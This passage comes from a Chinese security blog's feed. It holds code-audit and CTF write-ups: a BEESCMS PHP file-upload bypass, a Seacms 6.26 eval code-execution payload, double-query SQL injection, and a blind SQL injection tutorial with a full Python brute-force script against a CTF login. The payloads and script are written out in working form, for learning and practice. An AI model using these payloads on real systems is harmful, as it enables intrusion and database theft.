class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_type=$file[&apos;type&apos;];</span><br><span class="line">if(!in_array(strtolower($file_type),$type))&#123;</span><br><span class="line">msg(&apos;上传图片格式不正确&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对文件类型进行判断时取的是mime类型，可以通过burpsuit抓包更改。<br>文件名称的处理为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$up_file_name=empty($pic_alt)?date(&apos;YmdHis&apos;).rand(1,10000):$pic_alt;</span><br><span class="line">$up_file_name2=iconv(&apos;UTF-8&apos;,&apos;GBK&apos;,$up_file_name);</span><br><span class="line">$file_name=$path.$up_file_name2.&apos;.&apos;.$pic_name[&apos;extension&apos;];</span><br></pre></td></tr></table></figure></p><p>文件后缀取的是$pic_name[‘extension’]！！！<br>文件名称虽然被更改并且随机化，但可以枚举的办法获得。此外可以在后台网站基本设置logo图片处上传php文件抓包更改mime类型后，可以看到文件名。<br><img src="/2018/12/04/代码审计入门-BEESCMS4.0/2.png" alt=""><br><img src="/2018/12/04/代码审计入门-BEESCMS4.0/3.png" alt=""><br>获得地址:<a href="http://127.0.0.1/upload/img/201812031932133189.php" target="_blank" rel="noopener">http://127.0.0.1/upload/img/201812031932133189.php</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;BEESCMS企业网站管理系统是一款PHP+MYSQL的多语言系统，内容模块易扩展，模板风格多样化，模板制作简单功能强大，专业SEO优化，后
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="文件上传" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>Seacms6.26任意代码执行漏洞分析</title>
    <link href="http://yoursite.com/2018/11/26/Seacms6.26%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/11/26/Seacms6.26任意代码执行漏洞分析/</id>
    <published>2018-11-26T14:57:50.000Z</published>
    <updated>2018-11-26T15:22:09.500Z</updated>
    
    <content type="html"><![CDATA[<p>简介：海洋影视管理系统(seacms，海洋cms)是一套专为不同需求的站长而设计的视频点播系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需5分钟即可建立一个海量的视频讯息的行业网站。<br>由于是新手，所以在此低版本中进行代码审计练习。<br>在search.php中存在漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">require_once(&quot;include/common.php&quot;);</span><br><span class="line">require_once(sea_INC.&quot;/main.class.php&quot;);</span><br><span class="line"></span><br><span class="line">$schwhere = &apos;&apos;;</span><br><span class="line">foreach($_GET as $k=&gt;$v)</span><br><span class="line">&#123;</span><br><span class="line">    $$k=_RunMagicQuotes(gbutf8(RemoveXSS($v)));</span><br><span class="line">$schwhere.= &quot;&amp;$k=&quot;.urlencode($$k);</span><br><span class="line">&#125;</span><br><span class="line">$schwhere = ltrim($schwhere,&apos;&amp;&apos;);</span><br><span class="line"></span><br><span class="line">$page = (isset($page) &amp;&amp; is_numeric($page)) ? $page : 1;</span><br><span class="line">$searchtype = (isset($searchtype) &amp;&amp; is_numeric($searchtype)) ? $searchtype : -1;</span><br><span class="line">$tid = (isset($tid) &amp;&amp; is_numeric($tid)) ? intval($tid) : 0;</span><br><span class="line">if(!isset($searchword)) $searchword = &apos;&apos;;</span><br><span class="line">$action = $_REQUEST[&apos;action&apos;];</span><br><span class="line">$searchword = RemoveXSS(stripslashes($searchword));</span><br><span class="line">$searchword = addslashes(cn_substr($searchword,20));</span><br><span class="line">if($cfg_notallowstr !=&apos;&apos; &amp;&amp; m_eregi($cfg_notallowstr,$searchword))</span><br><span class="line">&#123;</span><br><span class="line">ShowMsg(&quot;你的搜索关键字中存在非法内容，被系统禁止！&quot;,&quot;index.php&quot;,&quot;0&quot;,$cfg_search_time*1000);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">if($searchword==&apos;&apos;&amp;&amp;$searchtype!=5)</span><br><span class="line">&#123;</span><br><span class="line">ShowMsg(&apos;关键字不能为空！&apos;,&apos;index.php&apos;,&apos;0&apos;,$cfg_search_time*1000);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第五行的循环可以以get方式接收任意参数及值  </p><p>在echoSearchPage()中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">$order = !empty($order)?$order:time;</span><br><span class="line">if(intval($searchtype)==5)</span><br><span class="line">&#123;</span><br><span class="line">$searchTemplatePath = &quot;/templets/&quot;.$GLOBALS[&apos;cfg_df_style&apos;].&quot;/&quot;.$GLOBALS[&apos;cfg_df_html&apos;].&quot;/cascade.html&quot;;</span><br><span class="line">$typeStr = !empty($tid)?intval($tid).&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$yearStr = !empty($year)?PinYin($year).&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$letterStr = !empty($letter)?$letter.&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$areaStr = !empty($area)?PinYin($area).&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$orderStr = !empty($order)?$order.&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$jqStr = !empty($jq)?$jq.&apos;_&apos;:&apos;0_&apos;;</span><br><span class="line">$cacheName=&quot;parse_cascade_&quot;.$typeStr.$yearStr.$letterStr.$areaStr.$orderStr;</span><br><span class="line">$pSize = getPageSizeOnCache($searchTemplatePath,&quot;cascade&quot;,&quot;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在该处以global方式声明了$area、$year等参数，而这些参数可以在url中任意构造。<br>这些值被保存于$cacheName中  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if($cfg_iscache)&#123;</span><br><span class="line">if(chkFileCache($cacheName))&#123;</span><br><span class="line">$content = getFileCache($cacheName);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$content = parseSearchPart($searchTemplatePath);</span><br><span class="line">setFileCache($cacheName,$content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$content = parseSearchPart($searchTemplatePath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该处$content读取html模板文件  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = str_replace(&quot;&#123;searchpage:order-hit-link&#125;&quot;,$cfg_basehost.&quot;/search.php?page=&quot;.$page.&quot;&amp;searchtype=5&amp;order=hit&amp;tid=&quot;.$tid.&quot;&amp;area=&quot;.$area.&quot;&amp;year=&quot;.$year.&quot;&amp;letter=&quot;.$letter.&quot;&amp;yuyan=&quot;.$yuyan.&quot;&amp;state=&quot;.$state.&quot;&amp;money=&quot;.$money.&quot;&amp;ver=&quot;.$ver.&quot;&amp;jq=&quot;.$jq,$content);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此处将输入的$area等参数插入$content中  </p><p>在function parseIf($content)中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">    return $content;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[0]);</span><br><span class="line">$elseIfFlag=false;</span><br><span class="line">for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">$strIf=$iar[1][$m];</span><br><span class="line">$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">$strThen=$iar[2][$m];</span><br><span class="line">$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">$strThen1=$elsearray[0];</span><br><span class="line">$strElse1=$elsearray[1];</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>preg_match_all处将之前插入的值取出<br>在@eval中执行语句  </p><p>payload:<a href="http://127.0.0.1/haiyang/search.php?searchtype=5&amp;letter=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/haiyang/search.php?searchtype=5&amp;letter=phpinfo()</a><br>效果：<br><img src="/2018/11/26/Seacms6.26任意代码执行漏洞分析/1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简介：海洋影视管理系统(seacms，海洋cms)是一套专为不同需求的站长而设计的视频点播系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需5分钟即可建立一个海量的视频讯息的行业网站。&lt;br&gt;由于是新手，所以在此低版本中进行代码审计练习。&lt;br&gt;
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>双查询注入</title>
    <link href="http://yoursite.com/2018/11/17/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2018/11/17/双查询注入/</id>
    <published>2018-11-16T16:12:01.000Z</published>
    <updated>2018-11-16T16:22:40.048Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>双查询就是select查询中再嵌套一个select查询。<br>双查询注入属于报错注入。<br>使用group by子句结合rand()函数以及像count（*）这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的。<br>参考：<a href="http://wooyun.jozxing.cc/static/drops/tips-14312.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a>  </p><h2 id="0x02-涉及函数"><a href="#0x02-涉及函数" class="headerlink" title="0x02 涉及函数"></a>0x02 涉及函数</h2><ol><li>Rand() //随机函数，返回0到1之间的数</li><li>Floor() //取整函数，返回小于或等于输入数的整数</li><li>Count() //汇总函数 COUNT(*) 函数返回在给定的选择中被选的行数。</li><li>Group by clause //分组语句 </li></ol><h2 id="0x03-例子"><a href="#0x03-例子" class="headerlink" title="0x03 例子"></a>0x03 例子</h2><p>例如：Sqli-labs less 5<br><img src="/2018/11/17/双查询注入/1.png" alt=""><br>由于查询结果不回显，可以通过双查询注入获得回显。<br>输入:<br>?id=2’ union select count(<em>),1,concat((select database()),floor(rand()</em>2)) as a from information_schema.tables group by a;%23<br><img src="/2018/11/17/双查询注入/2.png" alt=""><br>获取数据库名<br>通过构建双查询语句最终可获取flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-原理&quot;&gt;&lt;a href=&quot;#0x01-原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理&quot;&gt;&lt;/a&gt;0x01 原理&lt;/h2&gt;&lt;p&gt;双查询就是select查询中再嵌套一个select查询。&lt;br&gt;双查询注入属于报错注入。&lt;br&gt;使用
      
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL盲注</title>
    <link href="http://yoursite.com/2018/11/08/SQL%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2018/11/08/SQL盲注/</id>
    <published>2018-11-08T04:05:48.000Z</published>
    <updated>2018-11-16T16:19:24.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-原理及分类"><a href="#0x01-原理及分类" class="headerlink" title="0x01 原理及分类"></a>0x01 原理及分类</h2><p>SQL盲注是指在无法使用详细数据库错误消息或带内数据连接的情况下，利用数据库查询的输入审查漏洞<br>从数据库提取信息或提取与数据库查询相关信息的技术。<br>通俗的解释就是查询的数据不能回显到前端页面，需要一些方法进行判断。主要有两种办法：<br>1.基于布尔的SQL盲注<br>2.基于时间的SQL盲注  </p><h2 id="0x02-涉及的相关函数"><a href="#0x02-涉及的相关函数" class="headerlink" title="0x02 涉及的相关函数"></a>0x02 涉及的相关函数</h2><p>length(str)：返回str字符串的长度。<br>substr(str, pos, len)：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始<br>mid(str,pos,len):跟上面的一样，截取字符串<br>ascii(str)：返回字符串str的最左面字符的ASCII代码值。<br>ord(str):同上，返回ascii码<br>if(a,b,c) :a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0<br>count(): 获取列数<br>user():返回当前用户，若为root开头则是超级用户<br>database():返回当前数据库名<br>sleep(x):延时x秒  </p><h2 id="0x03-基于布尔的SQL盲注"><a href="#0x03-基于布尔的SQL盲注" class="headerlink" title="0x03 基于布尔的SQL盲注"></a>0x03 基于布尔的SQL盲注</h2><p>主要利用逻辑判断，如：  </p><p>获取库名长度：select 1 and length(database())&gt;5;  </p><p>获取指定位字符：select 1 and ascii(substr((select database()),1,1))&gt;1000;  </p><p>获取表数：select 1 and (select count(*) from information_schema.tables where table_schema=’dvwa’)&gt;2; </p><p>获取表名长度：select 1 and (select length(table_name) from information_schema.tables where table_schema=’dvwa’ limit 1,1)&gt;8;   </p><p>获取表名：select 1 and ascii(substr((select table_name from information_schema.tables where table_schema=’dvwa’ limit 0,1),1,1))&gt;1;  </p><p>获取列名长度：select 1 and (select length(column_name) from information_schema.columns where table_name=’dvwa’ limit 1,1)&gt;7; </p><h2 id="0x04基于时间的SQL盲注"><a href="#0x04基于时间的SQL盲注" class="headerlink" title="0x04基于时间的SQL盲注"></a>0x04基于时间的SQL盲注</h2><p>利用sleep(if(a,b,c))进行判断,如:</p><p>获取库名长度:select 1 and sleep(if(length(database())&gt;5,5,0));<br>即如果数据库名长度大于5就延时5s,通过服务器响应速度判断是否成立  </p><h2 id="0x04-ctf中的盲注"><a href="#0x04-ctf中的盲注" class="headerlink" title="0x04 ctf中的盲注"></a>0x04 ctf中的盲注</h2><p>jarvis oj 上的题目 simple injection:<br><img src="/2018/11/08/SQL盲注/3.png" alt=""><br>通过简单尝试发现正确用户名为’admin’,当用户名正确时显示‘密码错误’,用户名错误时显示’用户名错误’,因此<br>可进行基于d布尔的盲注<br>进一步尝试发现过滤了空格，可用/**/绕过，构造查询语句为:admin’/**/and/**/1=1;#<br>用二分法可以简化查询过程,利用python代码进行爆破:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">#encoding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://web.jarvisoj.com:32787/login.php&quot;</span><br><span class="line"></span><br><span class="line">#注入语句</span><br><span class="line">database = &apos;and/**/ascii(substr((select/**/database()),%d,1))&gt;%d;#&apos;</span><br><span class="line">table = &quot;and/**/ascii(substr((select/**/%s/**/from/**/%s/**/where/**/%s=&apos;%s&apos;/**/limit/**/%d,1),%d,1))&gt;%d;#&quot;</span><br><span class="line">column = &quot;and/**/ascii(substr((select/**/%s/**/from/**/%s/**/where/**/%s=&apos;%s&apos;/**/limit/**/%d,1),%d,1))&gt;%d;#&quot;</span><br><span class="line">text = &apos;and/**/ascii(substr((select/**/%s/**/from/**/%s.%s/**/limit/**/%d,1),%d,1))&gt;%d;#&apos;</span><br><span class="line">table_word = [&apos;information_schema.tables&apos;, &apos;table_schema&apos;, &apos;table_name&apos;]</span><br><span class="line">column_word = [&apos;information_schema.columns&apos;, &apos;column_name&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = &quot;admin&quot;</span><br><span class="line">pw = &quot;123&quot;</span><br><span class="line">success = &quot;密码错误&quot; #判断成功的标志</span><br><span class="line">admin = &quot;admin&apos;/**/&quot; </span><br><span class="line"></span><br><span class="line">#获取数据库名</span><br><span class="line">def Get_Database_name(lenth):</span><br><span class="line">    result = &apos;&apos;</span><br><span class="line">    x = 0</span><br><span class="line">    i = 1</span><br><span class="line">    while i&lt;lenth+1:</span><br><span class="line">        try:</span><br><span class="line">            l = 0</span><br><span class="line">            r = 126</span><br><span class="line">            while l &lt;= r:</span><br><span class="line">                x = (l + r) // 2</span><br><span class="line">                payload = admin + database % (i, x)           #构造payload</span><br><span class="line">                data = &#123;&apos;username&apos;:payload, &apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">                response = requests.post(url, data = data, timeout = 5)</span><br><span class="line">                #print(data)</span><br><span class="line">                if success not in response.text:  #判断是否为真</span><br><span class="line">                    r = x - 1</span><br><span class="line">                else:</span><br><span class="line">                    l = x + 1</span><br><span class="line">            x = (l + r) // 2 + 1</span><br><span class="line">            if x != 0:                    #字符不为空时加入名称字符串,否则跳出循环</span><br><span class="line">                result = result + chr(x)</span><br><span class="line">                print(x)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except requests.exceptions.ConnectionError:    #处理连接异常</span><br><span class="line">            response.status_code = &quot;Connection refused&quot;</span><br><span class="line">            print(&apos;retry....&apos;)</span><br><span class="line">            time.sleep(2)</span><br><span class="line">            i = i - 1</span><br><span class="line">        i += 1</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">#获取表名称</span><br><span class="line">def Get_Table_name(database):</span><br><span class="line">    Table_name = []</span><br><span class="line">    num = 20</span><br><span class="line">    for i in range(0, num):</span><br><span class="line">        lenth  = 20</span><br><span class="line">        result = &apos;&apos;</span><br><span class="line">        j = 1</span><br><span class="line">        while j&lt;lenth + 1:</span><br><span class="line">            try:</span><br><span class="line">                l = 0</span><br><span class="line">                r = 126</span><br><span class="line">                while l &lt;= r:</span><br><span class="line">                    x = (l + r) // 2</span><br><span class="line">                    payload = admin + table % (table_word[2], table_word[0], table_word[1], database, i, j, x)</span><br><span class="line">                    data = &#123;&apos;username&apos;:payload, &apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">                    response = requests.post(url, data=data, timeout = 5)</span><br><span class="line">                    #print(data)</span><br><span class="line">                    if success not in response.text:</span><br><span class="line">                        r = x - 1</span><br><span class="line">                    else:</span><br><span class="line">                        l = x + 1</span><br><span class="line">                x = (l + r) // 2 + 1</span><br><span class="line">                if x != 0:</span><br><span class="line">                    result = result + chr(x)</span><br><span class="line">                    print(x)</span><br><span class="line">                else:</span><br><span class="line">                    j += 1</span><br><span class="line">                    break</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                response.status_code = &quot;Connection refused&quot;</span><br><span class="line">                print(&apos;retry....&apos;)</span><br><span class="line">                time.sleep(0.5)</span><br><span class="line">                j = j - 1</span><br><span class="line">            j += 1</span><br><span class="line">        if result != &apos;&apos;:</span><br><span class="line">            print(str(i) + &apos;:&apos; + result)</span><br><span class="line">            Table_name.append(result)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    return Table_name</span><br><span class="line"></span><br><span class="line">#获取字段名称</span><br><span class="line">def Get_Column_name(tablename):</span><br><span class="line">    Column_name = []</span><br><span class="line">    num = 20</span><br><span class="line">    for i in range(0, num):</span><br><span class="line">        lenth = 20</span><br><span class="line">        result = &apos;&apos;</span><br><span class="line">        j = 1</span><br><span class="line">        while j&lt;lenth + 1:</span><br><span class="line">            try:</span><br><span class="line">                l = 0</span><br><span class="line">                r = 126</span><br><span class="line">                while l &lt;= r:</span><br><span class="line">                    x = (l + r) // 2</span><br><span class="line">                    payload = admin + column % (column_word[1], column_word[0], table_word[2], tablename, i, j, x)</span><br><span class="line">                    data = &#123;&apos;username&apos;:payload, &apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">                    response = requests.post(url, data=data, timeout = 5)</span><br><span class="line">                    #print(data)</span><br><span class="line">                    if success not in response.text:</span><br><span class="line">                        r = x - 1</span><br><span class="line">                    else:</span><br><span class="line">                        l = x + 1</span><br><span class="line">                x = (l + r) // 2 + 1</span><br><span class="line">                if x != 0:</span><br><span class="line">                    result = result + chr(x)</span><br><span class="line">                    print(x)</span><br><span class="line">                else:</span><br><span class="line">                    j += 1</span><br><span class="line">                    break</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                response.status_code = &quot;Connection refused&quot;</span><br><span class="line">                print(&apos;retry....&apos;)</span><br><span class="line">                time.sleep(0.5)</span><br><span class="line">                j = j - 1</span><br><span class="line">            j += 1</span><br><span class="line">        if result != &apos;&apos;:</span><br><span class="line">            print(str(i) + &apos;:&apos; + result)</span><br><span class="line">            Column_name.append(result)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    return Column_name</span><br><span class="line"></span><br><span class="line">#获取字段内容</span><br><span class="line">def Get_Column_text(databasename, tablename, columnname):</span><br><span class="line">    Text_name = []</span><br><span class="line">    num = 10</span><br><span class="line">    for i in range(0, num):</span><br><span class="line">        lenth = 40</span><br><span class="line">        result = &apos;&apos;</span><br><span class="line">        j = 1</span><br><span class="line">        while j&lt;lenth + 1:</span><br><span class="line">            try:</span><br><span class="line">                l = 0</span><br><span class="line">                r = 126</span><br><span class="line">                while l &lt;= r:</span><br><span class="line">                    x = (l + r) // 2</span><br><span class="line">                    payload = admin + text % (columnname, databasename, tablename, i, j, x)</span><br><span class="line">                    data = &#123;&apos;username&apos;:payload, &apos;password&apos;:&apos;123&apos;&#125;</span><br><span class="line">                    response = requests.post(url, data=data, timeout = 5)</span><br><span class="line">                    #print(data)</span><br><span class="line">                    if success not in response.text:</span><br><span class="line">                        r = x - 1</span><br><span class="line">                    else:</span><br><span class="line">                        l = x + 1</span><br><span class="line">                if x != 0:</span><br><span class="line">                    x = (l + r) // 2 + 1</span><br><span class="line">                    result = result + chr(x)</span><br><span class="line">                    print(x)</span><br><span class="line">                else:</span><br><span class="line">                    j += 1</span><br><span class="line">                    break</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                